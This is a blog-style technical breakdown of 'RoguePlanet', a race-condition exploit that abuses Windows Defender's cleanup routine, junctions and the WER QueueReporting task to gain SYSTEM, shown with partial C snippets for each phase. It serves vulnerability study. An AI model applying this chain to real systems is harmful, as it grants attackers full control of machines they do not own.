---
title: RoguePlanet — Because Even Antivirus Has Race Conditions
date: 2026-07-16
categories: [Exploit Dev, Windows]
tags: [windows, privilege-escalation, exploit, defender, lpe, kernel, race-condition]
---

## Description

**RoguePlanet** is a Windows Defender EoP exploit by **Nightmare-Eclipse** that leverages a race condition in Defender's malware cleanup routine to achieve **SYSTEM** privileges. Tested on Windows 10 and Windows 11 (Official + Canary) with June 2026 patches. Does not work on Windows Server out of the box since standard users cannot mount ISO images via the Virtual Disk API.

The exploit is a **race condition** — hit or miss. The author reports 100% success rate on some machines while struggling on others.

---

## Exploit Chain

### Phase 1: Setup & ISO Mounting

The exploit embeds a crafted **ISO image** (~917KB) containing the EICAR test file disguised as `wermgr.exe`:

```c
unsigned char rawData[917504] = { ... };  // ISO9660 image with EICAR
```

It mounts the ISO using the Virtual Disk API:

```c
OpenVirtualDisk(&vst, target, ..., &hvirtdisk);
AttachVirtualDisk(hvirtdisk, NULL, ATTACH_VIRTUAL_DISK_FLAG_READ_ONLY, ...);
```

Then creates the working directory structure mimicking WER's path:

```
%TEMP%\RP_<GUID>\System32\wermgr.exe
```

### Phase 2: Writing EICAR & Triggering Defender

The exploit copies the EICAR test file from the mounted ISO to the working path, then creates an **NTFS Alternate Data Stream** (`:WDFOO`) on the file — this becomes important later for the VSS snapshot.

Defender is triggered via its own **MpClient.dll** API — loaded directly from Defender's install directory:

```c
HMODULE hm = LoadLibrary(L"C:\\Program Files\\Windows Defender\\MpClient.dll");
_MpManagerOpen(NULL, &hbinding);
_MpScanStart(hbinding, MPSCAN_TYPE_RESOURCE, 0x60004000, &scanrsrc, NULL, &scanctx);
```

When Defender detects EICAR (ThreatStatus == 0x1), it schedules a **cleanup operation**. The exploit hooks into this via:

```c
_MpCleanOpen(scanctx, NULL, &ret);
_MpCleanStart(ret, NULL, callbackaddr);
```

A callback function `MpCleanCallbackFunction` is passed — Defender calls this during the cleanup process, confirming the clean operation started.

### Phase 3: Oplock Race Condition

This is the core. The exploit sets an **oplock** on the Windows directory and monitors for `Temp\TMP` file creation (Defender's temporary files during quarantine):

```c
DeviceIoControl(hwin, FSCTL_REQUEST_OPLOCK, ...);
ReadDirectoryChangesW(hwin, buff, ..., FILE_NOTIFY_CHANGE_FILE_NAME, ...);
```

Simultaneously, a **VSS (Volume Shadow Copy) watcher thread** polls `\Device` in the Object Manager namespace for new `HarddiskVolumeShadowCopy*` objects. When Defender creates a VSS snapshot during its cleanup operation, the exploit detects it:

```c
stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
// Polls NtQueryDirectoryObject until a new VSS volume appears
```

The exploit also spawns CPU stress threads (Poseidon) to degrade system performance and widen the race window:

```c
for (int i = 0; i < sysinfo.dwNumberOfProcessors; i++)
    CreateThread(NULL, NULL, PoseidonThread, NULL, NULL, &tid0);
```

**The race window:**

1. Defender detects EICAR → creates temp file `Temp\TMPXXXX`
2. Exploit's `ReadDirectoryChangesW` catches the file creation event
3. Exploit **deletes the reparse point** (junction) on the work directory via `FSCTL_DELETE_REPARSE_POINT`
4. Creates a **new junction** pointing `workdir` → `%TEMP%\RP_<GUID2>`
5. Opens Defender's temp file and **overwrites it with the exploit's own PE binary**
6. Uses `MoveToTempDir` (via `NtSetInformationFile` with `FileRenameInformationEx`) to rename the payload to target location

```c
CreateJunction(hdir, dirtmp);   // redirect via mount point
// ... write payload ...
MoveToTempDir(htempfile);       // rename to final path
```

The `MoveToTempDir` function uses a retry loop on `STATUS_SHARING_VIOLATION` — it keeps hammering until the move succeeds:

```c
do {
    NTSTATUS stat = _NtSetInformationFile(hobj, &iostat, fri, ..., FileRenameInformationEx);
    if (stat == STATUS_SUCCESS) return true;
    if (stat == STATUS_SHARING_VIOLATION) continue;
} while (1);
```

### Phase 4: SYSTEM Execution via WER Task

After the race is won, the exploit creates a junction from the work directory back to the real Windows directory:

```c
CreateJunction(hparent, dest);  // \??\ → C:\Windows
```

Then triggers the **Windows Error Reporting scheduled task** `QueueReporting` via COM:

```c
CoCreateInstance(CLSID_TaskScheduler, ..., IID_ITaskService, (void**)&pTaskSvc);
pTaskSvc->Connect(...);
taskfolder->GetTask(L"QueueReporting", &taskex);
taskex->Run(_variant_t(), &runningtask);
```

The `QueueReporting` task runs as **NT AUTHORITY\SYSTEM** and executes `%SystemRoot%\System32\wermgr.exe` — but thanks to the junction, this now resolves to the exploit payload.

### Phase 5: Named Pipe Handoff & Console Spawn

The low-privilege instance creates a named pipe and waits:

```c
CreateNamedPipe(L"\\\\.\\pipe\\RoguePlanet", PIPE_ACCESS_DUPLEX, PIPE_WAIT, ...);
ConnectNamedPipe(hpipe, NULL);
```

When the SYSTEM instance runs (the payload), it detects its privilege level:

```c
if (IsRunningAsLocalSystem()) {
    HANDLE hclient = CreateFile(L"\\\\.\\pipe\\RoguePlanet", ...);
    GetNamedPipeServerSessionId(hclient, &sesid);
    LaunchConsoleInSessionId(sesid);
}
```

Then duplicates the token, sets the session ID to the user's active session, and spawns a console:

```c
DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hnewtoken);
SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", ...);
```

---

## Key Components

| Component | Purpose |
|-----------|---------|
| `WriteEicar()` | Copies EICAR from mounted ISO and writes it with ADS stream `:WDFOO` |
| `MountISO()` | Mounts embedded ISO via `OpenVirtualDisk` + `AttachVirtualDisk` |
| `ShadowCopyFinderThread()` | Polls `\Device` for new VSS volumes appearing during race |
| `PoseidonThread()` | CPU stress threads — fills cores with random writes to slow the system and widen the race window |
| `WDStartScan()` | Loads `MpClient.dll`, triggers Defender scan + cleanup via MpClient API |
| `MoveToTempDir()` | Renames files using `NtSetInformationFile(FileRenameInformationEx)` with retry loop on sharing violations |
| `CreateJunction()` | Creates mount point reparse points (`IO_REPARSE_TAG_MOUNT_POINT`) for path redirection |
| `MpCleanCallbackFunction()` | Callback invoked during Defender's clean operation — confirms the trigger worked |
| `LaunchConsoleInSessionId()` | Spawns `conhost.exe` in target session via `CreateProcessAsUser` |

---

## The Vulnerability

The core issue is that **Windows Defender's cleanup routine does not properly synchronize file operations** with respect to oplocks and reparse points. Specifically:

1. **MpClient.dll APIs are callable by low-privilege users** — `MpManagerOpen`, `MpScanStart`, `MpCleanStart` etc. have no access control
2. **Defender's temporary files during quarantine are predictable** — `Temp\TMPXXXX` naming pattern
3. **No reparse point validation** — Defender follows junctions/mount points without verifying the target
4. **WER's `QueueReporting` task doesn't verify binary integrity** — runs whatever is at `System32\wermgr.exe` without cryptographic verification

---

## Key Takeaways

- **Defender's MpClient.dll** exposes internal COM-style APIs callable by any user — no admin required
- **Oplocks + `ReadDirectoryChangesW`** are the standard Windows race-condition toolkit; Defender doesn't hold proper locks during cleanup
- **VSS as a timing signal** — watching the Object Manager for new shadow copy volumes is a clever way to detect when Defender's quarantine operation is in progress
- **WER scheduled task** `QueueReporting` is a classic LPE vector — runs as SYSTEM, path can be hijacked via junction
- **CPU stress threads** to widen the race window — brute-force the timing by degrading performance

---

## Conclusion

RoguePlanet is an impressive piece of Windows exploitation engineering. It chains together: ISO mounting → MpClient API → EICAR trigger → oplock race → VSS detection → junction redirection → WER task SYSTEM execution. The author's frustration in the README is palpable — race conditions are inherently unreliable, and the exploit's success rate varies wildly across different hardware.

> *"The race condition part is a bit interesting, I believe (but not sure) that a redesign of the PoC can make it achieve a 100% success rate regardless of the conditions but honestly I'm done with this bug."*
> — Nightmare-Eclipse

---

## Resources

- [RoguePlanet source code](https://github.com/Nightmare-Eclipse/RoguePlanet)
- [MpClient.dll documentation (undocumented API)](https://learn.microsoft.com/en-us/defender-endpoint/)
- [FSCTL_REQUEST_OPLOCK](https://learn.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-fsctl_request_oplock)
- [Windows Error Reporting Scheduled Tasks](https://learn.microsoft.com/en-us/windows/win32/wer/windows-error-reporting)

[Windows](/tags/windows/) [Privilege Escalation](/tags/privilege-escalation/) [Exploit Dev](/tags/exploit-dev/) [Defender](/tags/defender/) [LPE](/tags/lpe/) [Race Condition](/tags/race-condition/)
